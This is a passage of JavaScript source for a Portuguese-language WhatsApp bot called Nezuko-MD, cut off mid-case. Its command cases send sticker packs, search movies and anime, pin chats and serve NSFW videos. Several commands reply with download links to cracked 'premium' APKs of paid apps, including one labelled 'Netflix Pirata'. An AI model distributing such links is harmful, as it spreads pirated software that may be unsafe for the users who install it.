{title: "➽️️ 𝐑𝐈𝐕𝐄𝐋𝐃𝐀𝐃𝐄", rowId: `${prefix}serie5`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐀 𝐂𝐀𝐒𝐀 𝐃𝐎 𝐃𝐑𝐀𝐆𝐀̃𝐎 ", rowId: `${prefix}serie6`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐒𝐈𝐍𝐓𝐎𝐍𝐈𝐀 ", rowId: `${prefix}serie7`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐂𝐇𝐔𝐂𝐊𝐘 ", rowId: `${prefix}serie8`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐅𝐋𝐀𝐒𝐇 ", rowId: `${prefix}serie9`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐆𝐀𝐌𝐄 𝐎𝐅 𝐓𝐇𝐑𝐎𝐍𝐄𝐒", rowId: `${prefix}serie10`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐋𝐄𝐆𝐀𝐃𝐎𝐒", rowId: `${prefix}serie11`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐓𝐇𝐄 𝐆𝐎𝐎𝐃 𝐃𝐎𝐂𝐓𝐎𝐑 𝐎 𝐁𝐎𝐌 𝐃𝐎𝐔𝐓𝐎𝐑", rowId: `${prefix}serie12`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐓𝐇𝐄 𝐖𝐀𝐋𝐊𝐈𝐍𝐆 𝐃𝐄𝐀𝐃", rowId: `${prefix}serie13`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐏𝐄𝐀𝐊𝐘 𝐁𝐋𝐈𝐍𝐃𝐄𝐑𝐒", rowId: `${prefix}serie14`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐃𝐈𝐀́𝐑𝐈𝐎𝐒 𝐃𝐄 𝐔𝐌 𝐕𝐀𝐌𝐏𝐈𝐑𝐎 ", rowId: `${prefix}serie15`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐆𝐀𝐕𝐈𝐀̃𝐎 𝐀𝐑𝐐𝐔𝐄𝐈𝐑𝐎 ", rowId: `${prefix}serie16`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐖𝐄𝐒𝐓𝐖𝐎𝐑𝐋𝐃", rowId: `${prefix}serie17`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐋𝐔́𝐂𝐈𝐅𝐄𝐑 ", rowId: `${prefix}serie18`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐋𝐎𝐁𝐎 𝐀𝐃𝐎𝐋𝐄𝐒𝐂𝐄𝐍𝐓𝐄 ", rowId: `${prefix}serie19`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐋𝐀 𝐂𝐀𝐒𝐀 𝐃𝐄 𝐏𝐀𝐏𝐄𝐋", rowId: `${prefix}serie20`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐂𝐎𝐁𝐑𝐀 𝐊𝐀𝐈", rowId: `${prefix}serie21`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐋𝐎𝐕𝐄 𝐕𝐈𝐂𝐓𝐎𝐑", rowId: `${prefix}serie22`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐕𝐈𝐊𝐈𝐍𝐆𝐒 ", rowId: `${prefix}serie23`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐂𝐀𝐕𝐀𝐋𝐄𝐈𝐑𝐎 𝐃𝐀 𝐋𝐔𝐀", rowId: `${prefix}serie24`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐅𝐄𝐀𝐑 𝐓𝐇𝐄 𝐖𝐀𝐋𝐊𝐈𝐍𝐆 𝐃𝐄𝐀𝐃 ", rowId: `${prefix}serie25`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐑𝐈𝐂𝐊 𝐌𝐎𝐑𝐓𝐘", rowId: `${prefix}serie26`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐑𝐎𝐔𝐍𝐃 6", rowId: `${prefix}serie27`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐂𝐀𝐑𝐍𝐈𝐕𝐀𝐋 𝐑𝐎𝐖", rowId: `${prefix}serie28`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐃𝐀𝐑𝐊", rowId: `${prefix}serie29`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐀𝐑𝐐𝐔𝐄𝐈𝐑𝐎", rowId: `${prefix}serie30`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐄𝐔 𝐍𝐔𝐍𝐂𝐀", rowId: `${prefix}serie31`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐓𝐇𝐄 𝐋𝐀𝐒𝐓 𝐊𝐈𝐍𝐆𝐃𝐎𝐌", rowId: `${prefix}serie32`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐎 𝐋𝐈𝐕𝐑𝐎 𝐃𝐄 𝐁𝐎𝐁𝐀 𝐅𝐄𝐓𝐓", rowId: `${prefix}serie33`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐑𝐀𝐆𝐍𝐀𝐑𝐎𝐊", rowId: `${prefix}serie34`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐎𝐒 100", rowId: `${prefix}serie35`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐅𝐁𝐈", rowId: `${prefix}serie36`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐄𝐗𝐓𝐑𝐀𝐂𝐔𝐑𝐑𝐈𝐂𝐔𝐋𝐀𝐑 ", rowId: `${prefix}serie37`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐇𝐀𝐋𝐎", rowId: `${prefix}serie38`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐖𝐀𝐑𝐑𝐈𝐎𝐑 𝐍𝐔𝐍", rowId: `${prefix}serie39`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐀𝐍𝐍𝐄 𝐖𝐈𝐓𝐇", rowId: `${prefix}serie40`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐏𝐀𝐓𝐑𝐔𝐋𝐇𝐀 𝐃𝐎 𝐃𝐄𝐒𝐓𝐈𝐍𝐎", rowId: `${prefix}serie41`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐃𝐈𝐍𝐀𝐒𝐓𝐈𝐀", rowId: `${prefix}serie42`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐖𝐀𝐓𝐂𝐇𝐌𝐄𝐍 ", rowId: `${prefix}serie43`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➽️️ 𝐋𝐎𝐕𝐄𝐂𝐑𝐀𝐅𝐓 𝐂𝐎𝐔𝐍𝐓𝐑𝐘  ", rowId: `${prefix}serie44`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂= 𝙗𝙤𝙩 𝙈𝘿"}]
}]
sendlistA(from, "© _Copyright by Nezuko-MD", "", "[🕹️] 𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐒𝐄́𝐑𝐈𝐄𝐒 [🕹️️]", "Selecione abaixo:", botaoale)
break

case 'appspremium':
botaoale = [
{title: "",
rows: [
{title: "➣️️️ 𝐘𝐎𝐔𝐓𝐔𝐁𝐄 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 - 𝐓. 𝐃𝐀𝐑𝐊", rowId: `${prefix}app1 `, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➣️️️ 𝐘𝐎𝐔𝐓𝐔𝐁𝐄 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 - 𝐓. 𝐁𝐋𝐀𝐂𝐊", rowId: `${prefix}app2`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➣️️️ 𝐘𝐎𝐔𝐂𝐔𝐓 𝐏𝐑𝐎", rowId: `${prefix}app3`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➣️️️ 𝐏𝐈𝐂𝐒𝐀𝐑𝐓 𝐏𝐑𝐄𝐌𝐈𝐔𝐌", rowId: `${prefix}app4`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➣️️️ 𝐒𝐍𝐀𝐏𝐓𝐔𝐁𝐄 𝐏𝐑𝐄𝐌𝐈𝐔𝐌", rowId: `${prefix}app5`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➣️️️ 𝐊𝐈𝐍𝐄𝐌𝐀𝐒𝐓𝐄𝐑 𝐏𝐑𝐎", rowId: `${prefix}app6`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➣️️️ 𝐍𝐄𝐓𝐅𝐋𝐈𝐗 𝐏𝐈𝐑𝐀𝐓𝐀", rowId: `${prefix}app7`, description: "𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➣️️️ 𝐏𝐎𝐖𝐄𝐑-𝐃𝐈𝐑𝐄𝐂𝐓𝐎𝐑 𝐏𝐑𝐎", rowId: `${prefix}app8`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➣️️️ 𝐒𝐏𝐎𝐓𝐈𝐅𝐘 𝐏𝐑𝐄𝐌𝐈𝐔𝐌", rowId: `${prefix}app9`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"},
{title: "➣️️️ 𝐑𝐄𝐌𝐈𝐍𝐈 𝐏𝐑𝐎", rowId: `${prefix}app10`, description: "ж☬ˢLᎾᏒᎠᎬ༻꧂ 𝙗𝙤𝙩 𝙈𝘿"}]
}]
sendlistA(from, "© _Copyright by Nezuko-MD_", "", "[👥️] 𝐀𝐏𝐏𝐒 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 [👥]", "Selecione abaixo:", botaoale)
break

case 'app1':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

 📂 *Youtube Premium Tema Dark:* http://www.mediafire.com/file/x98arvls146n5i5/YouTube+Premium+15.43.32.apk/file
`)
break

case 'app2':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

📂 *Youtube Premium Tema Black:* http://www.mediafire.com/file/ourocauwy1hc3v1/YouTube+Black.apk/file
`)
break

case 'app3':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

📂 *YouCut Pro:* https://www.mediafire.com/file/5y6rp0t6ffgvnpm/YouCut-Pro-1.452.1119-SK_BR_CANAL.apk/file
`)
break

case 'app4':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

📂 *PicsArt Premium:* https://www.mediafire.com/file/dd1ej4z78uvdui8/base.apk/file
`)
break

case 'app5':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

📂 *Snaptube Premium:* http://www.mediafire.com/file/lfdc3ptkhear0w0/Snaptube_Premium_BY_FlashStudio.apk/file
`)
break

case 'googlesg':
try {
textin = args.join(" ")
txt1 = textin.split("/")[0];
txt2 = textin.split("/")[1];
txt3 = textin.split("/")[2];
if(!textin) return reply("Cade o texto?")
if(!textin.includes("/")) return reply(`Cade a / precisa dela para a separação..\nExemplo: ${prefix + command} Game/Play/Sad`)
reply(enviar.espere)
bla = await fetchJson(`https://nezsab-apis.xyz/api/${command}?texto=${txt1}&texto2=${txt2}&texto3=${txt3}&apikey=${keyapi}`)
blabla = await getBuffer(bla.resultado.imageUrl)
nezuko.sendMessage(from, {image: blabla}, {quoted: m}).catch(rs =>{
reply("ERROR!!")  
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break

case 'app6':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

📂 *KineMaster Pro:* https://www.mediafire.com/file/itxxeuct5efo075/Kinemaster_Premium_Download_2021.apk/file
`)
break

case 'app7':
await reply(`
Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

📂 *Netflix Pirata:* https://apkmstore.blogspot.com/2020/06/download-apk-mediaflix-plus.html?m=1
`)
break

case 'app8':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

📂 *PowerDirector PRO:* https://www.mediafire.com/file/1et7hx53dwgjk89/PowerDirector_Premium_v9.2.0_ATUALIZADO_2021_PRO.om.apk/file
`)
break

case 'app9':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

📂 *Spotify Premium:* https://www.mediafire.com/file/5ajeu8dysva0pso/SPOTIFY_PREMIUM_100%2525_M%25C3%259ASICA_OFFLINE.apk/file`)
break



case 'app10':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
☔ *Número:* @${sender.split("@")[0]}

📂 *Remini Pro:* https://techgara.com/download/mod/remini-pro-31633-1357/`)
break

case 'filmee2': //by Nezuko-MD 
keyyubi = "key-free"
if(!q) return reply("_Coloque o nome do filme *após o comando*_.")
axios.get(`https://isyubii-api.tk/api/filme?nome=${q}&apikey=${keyyubi}`)
.then(e => {
try{
d = e.data.resultado;
txt = '🎬𝐅𝐈𝐋𝐌𝐄 𝐄𝐍𝐂𝐎𝐍𝐓𝐑𝐀𝐃𝐎🎭\n\n';
no = 0;
for (let i of d) {
no += 1;
txt += `
𝐅𝐈𝐋𝐌𝐄: ${no}\n
𝐓𝐈́𝐓𝐔𝐋𝐎: ${i.titulo}\n
𝐋𝐈𝐍𝐊: ${i.link}\n
🎬  𝐃𝐄𝐒𝐂𝐑𝐈𝐂̧𝐀̃𝐎 𝐃𝐎 𝐅𝐈𝐋𝐌𝐄: ${i.sinopse}\n
――――――――――――――――――――`;
}
nezuko.sendMessage(from, {image:{url: d[0].img}, caption:txt})
}catch(err){
reply(`Resultado do filme ${q} não foi encontrado.`)
}
}).catch(err => {
console.log('Ops, eu acho que a api caiu 😢');
});
break

case 'filme'://Daniel dev
if(!q) return reply("_Coloque o nome do filme *após o comando*_.")
axios.get(`https://nezsab-apis.xyz/api/filme?q=${q}&apikey=${keyapi}`)
.then(e => {
try{
d = e.data.resultado;
txt = '';
no = 0;
for (let i of d) {
no += 1;
txt += `✓ 💬 Foram encontrados ${no} relacionados com a sua pesquisa: *${q}*\n
× ✨ 𝘛𝘪́𝘵𝘶𝘭𝘰⧽ ${i.titulo}
× 🔗 𝘓𝘪𝘯𝘬⧽ ${i.link}\n
× 🎬 𝘚𝘪𝘯𝘰𝘱𝘴𝘦⧽ ${i.sinopse}`;
}
nezuko.sendMessage(from, {image:{url: d[0].img}, caption:txt})
}catch(err){
reply(`Resultado do filme ${q} não foi encontrado.`)
}
}).catch(err => {
console.log('Ops, eu acho que a api caiu 😢');
});
break

case 'packfigu':
case 'packfigurinhas':
addFilter(from)   
anu = await getBuffer(`https://nezsab-apis.xyz/api/stickera?apikey=${keyapi}`)
await nezuko.sendMessage(from, { sticker: anu}, {quoted: dnselo})
anuu = await getBuffer(`https://nezsab-apis.xyz/api/stickera?apikey=${keyapi}`)
await nezuko.sendMessage(from, { sticker: anuu}, {quoted: dnselo})
anuuu = await getBuffer(`https://nezsab-apis.xyz/api/stickera?apikey=${keyapi}`)
await nezuko.sendMessage(from, { sticker: anuuu}, {quoted: dnselo})
anuuuu = await getBuffer(`https://nezsab-apis.xyz/api/stickera?apikey=${keyapi}`)
await nezuko.sendMessage(from, { sticker: anuuuu}, {quoted: dnselo})
anuuuuu = await getBuffer(`https://nezsab-apis.xyz/api/stickera?apikey=${keyapi}`)
await nezuko.sendMessage(from, { sticker: anuuuuu}, {quoted: dnselo})
fig = await getBuffer(`https://nezsab-apis.xyz/api/stickera?apikey=${keyapi}`)
await nezuko.sendMessage(from, { sticker: fig}, {quoted: dnselo})
figu = await getBuffer(`https://nezsab-apis.xyz/api/stickera?apikey=${keyapi}`)
await nezuko.sendMessage(from, { sticker: figu}, {quoted: dnselo})
figuu = await getBuffer(`https://nezsab-apis.xyz/api/stickera?apikey=${keyapi}`)
await nezuko.sendMessage(from, { sticker: figuu}, {quoted: dnselo})
figuuu = await getBuffer(`https://nezsab-apis.xyz/api/stickera?apikey=${keyapi}`)
await nezuko.sendMessage(from, { sticker: figuuu}, {quoted: dnselo})
figuuuu = await getBuffer(`https://nezsab-apis.xyz/api/stickera?apikey=${keyapi}`)
await nezuko.sendMessage(from, { sticker: figuuuu}, {quoted: dnselo})
stic = await getBuffer(`https://nezsab-apis.xyz/api/stickera?apikey=${keyapi}`)
await nezuko.sendMessage(from, { sticker: stic}, {quoted: dnselo})
sti = await getBuffer(`https://nezsab-apis.xyz/api/stickera?apikey=${keyapi}`)
await nezuko.sendMessage(from, { sticker: sti}, {quoted: dnselo})
stick = await getBuffer(`https://nezsab-apis.xyz/api/stickera?apikey=${keyapi}`)
await nezuko.sendMessage(from, { sticker: stick}, {quoted: dnselo})
sticke = await getBuffer(`https://nezsab-apis.xyz/api/stickera?apikey=${keyapi}`)
await nezuko.sendMessage(from, { sticker: sticke}, {quoted: dnselo})
sticker = await getBuffer(`https://nezsab-apis.xyz/api/stickera?apikey=${keyapi}`)
await nezuko.sendMessage(from, { sticker: sticker}, {quoted: dnselo})
buttonss = [
  {buttonId: `${prefix}packfigu`, buttonText: {displayText: '✰ۜۜ͜͡𝐏𝐑𝐎́𝐗𝐈𝐌𝐎-𝐏𝐀𝐂𝐎𝐓𝐄🎊'}, type: 1},
  {buttonId: `${prefix}packfinaliz`, buttonText: {displayText: '✰ۜۜ͜͡𝐍𝐀̃𝐎-𝐆𝐄𝐑𝐀𝐑❌'}, type: 1}]
buttonMessagse = {
    text: "➡️ Oiie gatinho(a), enviei 15 figurinhas e talvez eu acabe duplicando e enviando alguma repetida para você.\n• _O *pacote de figurinha* chegou ao fim, mais não fique triste neném, caso deseja mais um pack, clique no botão abaixo:_",
    footer: `By: ${NomeDoBot}`,
    buttons: buttonss,
    headerType: 1
}
nezuko.sendMessage(from, buttonMessagse, {quoted: dnselo}) 
break

case 'packfinaliz':
await reply('Entendido chefe, não irei gerar outro pacote de figurinhas para você.')
break

case 'figaleatoria':
bla = await getBuffer(`https://nezsab-apis.xyz/api/stickera?apikey=${keyapi}`)
nezuko.sendMessage(from, {sticker: bla}, {quoted: dnselo})
buttonss = [
  {buttonId: `${prefix}figaleatoria`, buttonText: {displayText: '✰ۜۜ͜͡𝐏𝐑𝐎́𝐗𝐈𝐌𝐀-𝐅𝐈𝐆𝐔𝐑𝐈𝐍𝐇𝐀🧧'}, type: 1}]
buttonMessagse = {
    text: "Estou gerando sua figurinha, aguarde...\nCaso desejar outra, selecione abaixo:",
    footer: `By: ${NomeDoBot}`,
    buttons: buttonss,
    headerType: 1
}
nezuko.sendMessage(from, buttonMessagse, {quoted: dnselo})
break

case 'figurinhas':
try {
if(!Number(q)) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix+command} 7`)
if(q >= 100) return reply("Coloque abaixo de 100...")
if (m.isGroup) m.reply(`<❗> As figurinhas estão sendo enviada em seu privado.`)
reply(`Aguarde um pouco...`)
async function figus() {
bala = await getBuffer(`https://nezsab-apis.xyz/api/stickera?apikey=${keyapi}`)
bass64 = `data:image/jpeg;base64,${bala.toString('base64')}`
mantap = await convertSticker(bass64, sender.split("@")[0], `${NomeDoBot}`)
imageBuffer = new Buffer.from(mantap, 'base64');
nezuko.sendMessage(sender, {sticker: imageBuffer})
}
for ( i = 0; i < q; i++) {
await sleep(2000)
figus()
}
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar") 
} else {
reply('ERROR!!')
}
}
break
//===========FIXAR GRUPO=============\\
case 'fixar':
if (!SoDono) return reply(`<❗> Somente meu dono pode usar esse comando.`)
reply('Pronto, ja fixei esse chat.')
nezuko.modifyChat(from, ChatModification.pin)
break

case 'desfixar':
if (!SoDono) return reply(`<❗> Somente meu dono pode usar esse comando.`)
reply('Pronto, ja desfixei esse chat.')
nezuko.modifyChat(from, ChatModification.unpin)
break
//===============FIM================\\

case 'ytaudio3': case 'play0':
// @Jesquinha-MD by Carlos
reply('Isso demora um minuto pq o fornecedor tá lento, agradeço a compreensão desde já!')
anu = await fetchJson(`https://p7api.xyz/api/ytmp3v2?link=${res.all[0].url}&apikey=${keydop7}`)
nezuko.sendMessage(from, { audio: { url: anu.resultado.link }, mimetype: 'audio/mpeg', fileName: `${anu.título}.mp3` }, { quoted: dnselo})
break

case 'hentai': {
                if (!isNsfw) return reply(`É necessário que o comando seja ativado por um adm\nExemplo: ${prefix}nsfw`)


                m.reply(enviar.espere)
                anu = await hentai()
                result = anu[Math.floor(Math.random(), anu.length)]
                nezuko.sendMessage(m.chat, { video: { url: result.video_1 }, caption: `⊳ Título : ${result.title}\n⊳ Categoria : ${result.category}\n⊳ Mimetype : ${result.type}\n⊳ Visualizações : ${result.views_count}\n⊳ Compartilhamentos : ${result.share_count}\n⊳ Arquivo : ${result.link}\n⊳ Link da mídia : ${result.video_1}` }, { quoted: dnselo})
            }

                break

case 'anime': {
if(!q.length > 1) return reply("Cade o título que deseja pesquisar?")
var Lrows = []
datab = await fetchJson(`https://nezsab-apis.xyz/api/animes?q=${q}&apikey=${keyapi}`)
for(let a of datab.resultado) {
Lrows.push({title: a.titulo, description: `Link: ${a.link}`, rowId: `inhaê`})
}
listMessage = {
text: `Selecione para ver as informações\ndetalhadas sobre o resultado!`,
footer: `By: ${NomeDoBot}`,
title: `𝐏𝐄𝐒𝐐𝐔𝐈𝐒𝐀: 𝐀𝐍𝐈𝐌𝐄`,
buttonText: "🧧𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🧧️",
sections: [{
title: `${NomeDoBot}`, 
rows: Lrows
}
]
}
nezuko.sendMessage(from, listMessage)
}
break

case 'sfile': {
if(!q.length > 1) return reply("Cade o título que deseja pesquisar?")
var Lrows = []
datab = await fetchJson(`https://nezsab-apis.xyz/api/sfile?q=${q}&apikey=${keyapi}`)
for(let a of datab.resultado) {
Lrows.push({title: `➡️ Arquivo: ${a.nome}`, description: `Icone: ${a.icon}\nLink: ${a.link}`, rowId: `inhaê`})
}
listMessage = {
text: `Selecione para ver as informações\ndetalhadas sobre o resultado!`,
footer: `By: ${NomeDoBot}`,
title: `𝐏𝐄𝐒𝐐𝐔𝐈𝐒𝐀: 𝐒𝐅𝐈𝐋𝐄`,
buttonText: "🧧𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🧧️",
sections: [{
title: `${NomeDoBot}`, 
rows: Lrows
}
]
}
nezuko.sendMessage(from, listMessage)
}
break

case 'anime1':
if (args.length < 1) return reply('erro')
teks = body.slice(7)
if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
reply('<❗> Estou realizando seu pedido, se der erro *tente novamente mais tarde.*')
venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis2.jpg?text.0.text=${teks}&text.0.position.gravity=center&text.0.position.x=1%25&text.0.position.y=16%25&text.0.size=80&text.0.color=ff2772&text.0.opacity=67&text.0.font.family=Bangers&text.0.font.style=italic&text.0.background.opacity=50&text.0.outline.width=6`)
nezuko.sendMessage(from, { image: venomk }, { quoted: sasah })
break

case 'ff1':
if (args.length < 1) return reply('erro')
teks = body.slice(7)
if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
reply('<❗> Estou realizando seu pedido, se der erro *tente novamente mais tarde.*')
venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis3.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=59%25&text.0.size=89&text.0.color=000000&text.0.opacity=71&text.0.font.family=Changa%20One&text.0.font.style=italic&text.0.background.opacity=10&text.0.outline.color=ffffff&text.0.outline.width=3`)
nezuko.sendMessage(from, { image: venomk }, {quoted: sasah })
break	

case 'gam':
if (args.length < 1) return reply('erro')
teks = body.slice(7)
if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
reply('<❗> Estou realizando seu pedido, se der erro *tente novamente mais tarde.*')
venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis5.jpg?text.0.text=${teks}&text.0.position.gravity=center&text.0.position.x=1%25&text.0.position.y=22%25&text.0.align=left&text.0.size=59&text.0.font.family=Permanent%20Marker&text.0.outline.color=df00ff&text.0.outline.width=2&text.0.outline.blur=18`)
nezuko.sendMessage(from, { image: venomk }, { quoted: sasah })
break

case 'ff2':
if (args.length < 1) return reply('erro')
teks = body.slice(7)
if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
reply('<❗> Estou realizando seu pedido, se der erro *tente novamente mais tarde.*')
venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis6.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.x=1%25&text.0.position.y=50%25&text.0.size=68&text.0.color=464646&text.0.opacity=51&text.0.font.family=Sigmar%20One&text.0.background.opacity=2&text.0.outline.color=ffffff&text.0.outline.width=2&text.0.outline.opacity=61`)
nezuko.sendMessage(from, { image: venomk }, { quoted: sasah })
break	

case 'anime2':
if (args.length < 1) return reply('erro')
teks = body.slice(7)
if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
reply('<❗> Estou realizando seu pedido, se der erro *tente novamente mais tarde.*')
venomk = await getBuffer(`https://lollityp.sirv.com/venom_apis7.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.x=1%25&text.0.position.y=58%25&text.0.size=69&text.0.color=00ffea&text.0.opacity=37&text.0.font.family=Bangers&text.0.background.opacity=77&text.0.outline.color=ffffff&text.0.outline.width=2&text.0.outline.blur=20`)
nezuko.sendMessage(from, { image: venomk }, { quoted: sasah })
break

case 'entardecer':
if (args.length < 1) return reply('erro')
teks = body.slice(7)
if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
reply('<❗> Estou realizando seu pedido, se der erro *tente novamente mais tarde.*')
